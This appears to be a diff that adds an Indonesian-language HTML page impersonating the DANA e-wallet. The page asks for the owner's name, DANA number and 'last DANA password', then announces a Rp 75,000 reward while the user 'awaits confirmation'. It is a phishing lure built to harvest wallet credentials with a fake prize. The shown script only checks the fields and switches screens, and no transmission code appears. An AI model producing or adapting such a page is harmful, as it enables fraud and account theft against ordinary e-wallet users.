@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Form Data DANA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: auto;
+    }
+    .hidden {
+      display: none;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      background-color: #4CAF50;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="formContainer">
+    <h2>Masukkan Data Anda</h2>
+    <input type="text" id="nama" placeholder="Nama Pemilik" required>
+    <input type="text" id="noDana" placeholder="No DANA" required>
+    <input type="password" id="sandi" placeholder="Sandi Terakhir DANA" required>
+    <button onclick="lanjut()">Selanjutnya</button>
+  </div>
+
+  <div class="container hidden" id="hasilContainer">
+    <h2>Selamat!</h2>
+    <p>Akun anda berhak mendapatkan uang senilai:</p>
+    <h3>Rp. 75.000,00</h3>
+    <p>Silakan menunggu konfirmasi uang anda masuk.</p>
+  </div>
+
+  <script>
+    function lanjut() {
+      const nama = document.getElementById('nama').value.trim();
+      const noDana = document.getElementById('noDana').value.trim();
+      const sandi = document.getElementById('sandi').value.trim();
+
+      if (!nama || !noDana || !sandi) {
+        alert("Harap isi semua data.");
+        return;
+      }
+
+      // Ganti tampilan ke tampilan kedua
+      document.getElementById('formContainer').classList.add('hidden');
+      document.getElementById('hasilContainer').classList.remove('hidden');
+    }
+  </script>
+
+</body>
+</html>
